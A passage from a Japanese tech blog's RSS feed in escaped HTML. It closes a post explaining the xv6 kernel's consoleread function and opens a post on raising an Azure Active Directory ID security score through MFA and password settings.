      &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;myproc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;killed&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;release&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;cons&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;ilock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ip&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;token function&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;input&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;r&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;cons&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; input&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;buf&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;input&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;r&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; INPUT_BUF&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token char&quot;&gt;&apos;D&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// EOF&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;n &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; target&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;// Save ^D for next time, to make sure&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;// caller gets a 0-byte result.&lt;/span&gt;
        input&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;r&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;dst&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; c&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;n&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token char&quot;&gt;&apos;\n&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;release&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;cons&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;ilock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ip&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; target &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; n&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;consolwrite&lt;/code&gt;関数同様メモリロックと&lt;code class=&quot;language-text&quot;&gt;inode&lt;/code&gt;のロック解除を行った後、指定されたバッファサイズのループ内で以下の処理を行います。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; input&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;buf&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;input&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;r&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; INPUT_BUF&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token char&quot;&gt;&apos;D&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// EOF&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;n &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; target&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// Save ^D for next time, to make sure&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// caller gets a 0-byte result.&lt;/span&gt;
    input&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;r&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;dst&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; c&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;n&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token char&quot;&gt;&apos;\n&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;input&lt;/code&gt;構造体は以下の構造体です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;INPUT_BUF&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;128&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; buf&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;INPUT_BUF&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint r&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// Read index&lt;/span&gt;
  uint w&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// Write index&lt;/span&gt;
  uint e&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// Edit index&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; input&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;この&lt;code class=&quot;language-text&quot;&gt;input&lt;/code&gt;構造体に入ってきた値を1文字ずつ読みだして取得しているようです。&lt;/p&gt;
&lt;p&gt;実際にこの処理が呼び出されるのは、OSの起動が完了してからです。&lt;/p&gt;
&lt;p&gt;具体的には、シェルに入力した文字を取得する際などに使用されます。&lt;/p&gt;
&lt;p&gt;以下の画像は、コンソールに「l」という文字を打ち込んだ際の挙動をデバッガで確認したときのものです。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/43ea7f9468b2523fc26c4779efb0ac06/0b533/image-38.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 54.166666666666664%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAARlAAAEZQAGA43XUAAACZklEQVQoz4VTSW/TQBidNnYIzerETtokbaqozeY6e7xNHGfpRkq6QVNa2v4DRCUoJy69IBDiwoUrFyQucOAvIH7X44svwIUensbfjPX0lhm2uVSHk6hBD5VhhMvQZ4hptFa8vb9hRCowI/QdLKMvl/HpSsP3F028m6zjdiDjdpgEG+Zb6M0IFwowggX6uejBCJVo/rPO9hpCHvX5VWhsFWZgGW+3Uvj2TMeXpyv4sBnCGzcMZi830UnZsJUGnGUOLtdhxuukRoUeJaXRDRgEXapibIxwNBzjeDTB6fZDXD/ZwfvrKT7eTPHqag8vz7fBeJYsr3ThpmpwF1twlmoYJKsw4mVYCbKYIKsxUkoWjw4OMD079XB2cY7p+QX2H51i7/AxJkeE4xOwcaGHSWmA3TzHeN1BTyF1MRU8VYWba4AvbhBUGIkSfGwOjLH/Y18d4qS5S6R9HKojDEilFVrHMFnCg1wR/UwZo1wFbqaCbDKNTDYDRVEQCATg9/v/gSiKYKNVG+4Kh5vuoJe1wJUmHMqzSxk6URU2Nc4pPyuuIRVXEJNiCAWD8Pl8HoEoiN4qCIK3x7bWXDQzLiylhXbagZXS4WQ5OlHKUW6gQwVxugVtSYN/Trzb8mbe8YhMuQk9zT3iWUk2Ec/U6rEqTFLZoqZFJtxNOMySogQ1vdTyirCTbXTlKnrUqhEtkdUquqTQlFRE/AtkcR73BMpsXkB8QYASEaGE/UiE7kOimfWlCrrUqiPXKCsNFuVlSxuwo3RV6FWYdDabLcqzHS6gFV5DnR5BTyni62URP29U/HrN8eN5H58vNfwGvBdC44No/BYAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/43ea7f9468b2523fc26c4779efb0ac06/8ac56/image-38.webp 240w,
/static/43ea7f9468b2523fc26c4779efb0ac06/d3be9/image-38.webp 480w,
/static/43ea7f9468b2523fc26c4779efb0ac06/b0a15/image-38.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/43ea7f9468b2523fc26c4779efb0ac06/8ff5a/image-38.png 240w,
/static/43ea7f9468b2523fc26c4779efb0ac06/e85cb/image-38.png 480w,
/static/43ea7f9468b2523fc26c4779efb0ac06/0b533/image-38.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/43ea7f9468b2523fc26c4779efb0ac06/0b533/image-38.png&quot;
            alt=&quot;2022/02/image-38.png&quot;
            title=&quot;2022/02/image-38.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ユーザの入力値がどのように&lt;code class=&quot;language-text&quot;&gt;input.buf&lt;/code&gt;に格納されるかは、実際にシェルが使えるようになってから詳しく追っていこうと思います。&lt;/p&gt;
&lt;p&gt;最後に&lt;code class=&quot;language-text&quot;&gt;ioapicenable(IRQ_KBD, 0);&lt;/code&gt;で割込みを有効化して、&lt;code class=&quot;language-text&quot;&gt;consoleinit&lt;/code&gt;関数は終了します。&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;今回はコンソールの初期化を行いました。&lt;/p&gt;
&lt;p&gt;入出力インターフェースの仕組みについて知ることができたので非常に興味深かったです。&lt;/p&gt;
&lt;p&gt;次回はシリアルポートを初期化する&lt;code class=&quot;language-text&quot;&gt;uartinit&lt;/code&gt;関数から見ていきたいと思います。&lt;/p&gt;
&lt;h2 id=&quot;参考書籍&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot; aria-label=&quot;参考書籍 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;参考書籍&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3qZSCY7&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;30日でできる! OS自作入門&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3qXYsZX&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ゼロからのOS自作入門&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3q8TU3K&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;はじめてのOSコードリーディング ~UNIX V6で学ぶカーネルのしくみ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3I6fkVt&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;詳解 Linuxカーネル&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3JRUdI2&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;作って理解するOS x86系コンピュータを動かす理論と実装&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[Azure Active Directory の ID セキュリティスコアを確認してみる]]></title><link>https://kashiwaba-yuki.com/azure-setup-on-security</link><guid isPermaLink="false">https://kashiwaba-yuki.com/azure-setup-on-security</guid><pubDate>Tue, 08 Feb 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;ちょっと最近突然Azureで遊びたくなったのですが、マシンを建てたりする前にセキュリティ関連の推奨事項を確認しておくことにしました。&lt;/p&gt;
&lt;p&gt;そこで参照したのがIDセキュリティスコアというサービスですが、なんとログイン直後ではまさかの14%の達成率と、かなりセキュリティレベルが低い状況でした。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/692c36b1058f300a04519d42e43c7adf/0b533/image-10.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 70%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAARlAAAEZQAGA43XUAAAB7UlEQVQ4y4VTWZLTMBDV/Y/CNwV3oAbma6YIS0LC5t2SLWuz5Ue3Eps4EwpVdcnW0v2WluhVjsOvGmWjkNcSg9YwxiDGiP+N+c6aaGWFThtYH+AojLVomgbjOGKaJnjvEUJI/xyBzvhA8xQxz/OLEK22aTMQoEglVT+gKKuUtO97OOfQdR0sFeK5kQ0MJdXhjI+TbBBWbQUzDJjjdF5RT6i/P+Lp+RMeP7xH27br4dGP2D3soFuF0REQYzESembBoUkuUdQNiiJPSHgMMsfPHwfsPu+x339NqJahrcOrdw94/eUZbw8f8ebbDgcCpLseUkkopSA61WMghBzTRDoRA08xUbB2Ky3WiL6ZR6AvT/9ujnQunvcu1EWRnVAWBfpOEXUNZw080ZnnuNFoo9X8b7dF2UpYapPlQk86NLR26yIPRnyN+nqPJeMuEMa6TTXeYPqOXA0k9PVg17lHbxNye7EhIXiIvCzSQX+5zCYcj0dk2e+0zu3CBbjRzYXJPeTLQxBlVUJKmS4ml+ny6XQi54uEdmkJ1nRJfI0wtdPlEaSEsteEpFsT8pxlGaqqokJtOry2DdHii7cI/yaklzJRxTnGDXymzag76qsYpxUlF4vx1qyzhkshsVp/5Rajq+s6RdPUiSrrZ8xwJ+GW8h+yCUPfAGIRPQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/692c36b1058f300a04519d42e43c7adf/8ac56/image-10.webp 240w,
/static/692c36b1058f300a04519d42e43c7adf/d3be9/image-10.webp 480w,
/static/692c36b1058f300a04519d42e43c7adf/b0a15/image-10.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/692c36b1058f300a04519d42e43c7adf/8ff5a/image-10.png 240w,
/static/692c36b1058f300a04519d42e43c7adf/e85cb/image-10.png 480w,
/static/692c36b1058f300a04519d42e43c7adf/0b533/image-10.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/692c36b1058f300a04519d42e43c7adf/0b533/image-10.png&quot;
            alt=&quot;image-10.png&quot;
            title=&quot;image-10.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/azure/active-directory/fundamentals/identity-secure-score&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ID セキュリティ スコアとは - Azure Active Directory | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;というわけで今回はIDセキュリティスコアで推奨されているベストプラクティスを確認して、アカウント関連のセキュリティレベルを上げていきたいと思います。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot;&gt;もくじ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E7%AE%A1%E7%90%86%E3%83%AD%E3%83%BC%E3%83%AB%E3%81%AB%E5%AF%BE%E3%81%97%E3%81%A6-mfa-%E3%82%92%E8%A6%81%E6%B1%82%E3%81%99%E3%82%8B&quot;&gt;管理ロールに対して MFA を要求する&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%81%AE%E6%97%A2%E5%AE%9A%E5%80%A4%E7%BE%A4%E3%81%AE%E8%A8%AD%E5%AE%9A&quot;&gt;セキュリティの既定値群の設定&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%81%A7%E4%BF%9D%E8%AD%B7%E3%81%95%E3%82%8C%E3%81%9F%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9%E3%81%AE%E3%81%9F%E3%82%81%E3%81%AB%E3%81%99%E3%81%B9%E3%81%A6%E3%81%AE%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E3%81%8C%E5%A4%9A%E8%A6%81%E7%B4%A0%E8%AA%8D%E8%A8%BC%E3%82%92%E5%AE%8C%E4%BA%86%E3%81%A7%E3%81%8D%E3%82%8B%E3%81%93%E3%81%A8%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%99%E3%82%8B&quot;&gt;セキュリティで保護されたアクセスのためにすべてのユーザーが多要素認証を完了できることを確認する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E3%83%91%E3%82%B9%E3%83%AF%E3%83%BC%E3%83%89%E3%82%92%E7%84%A1%E6%9C%9F%E9%99%90%E3%81%AB%E3%81%99%E3%82%8B&quot;&gt;パスワードを無期限にする&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#windows-powershell-%E7%94%A8-microsoft-azure-ad-%E3%83%A2%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB%E3%81%A7%E3%83%91%E3%82%B9%E3%83%AF%E3%83%BC%E3%83%89%E3%81%AE%E6%9C%89%E5%8A%B9%E6%9C%9F%E9%99%90%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot;&gt;Windows PowerShell 用 Microsoft Azure AD モジュールでパスワードの有効期限を設定する&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
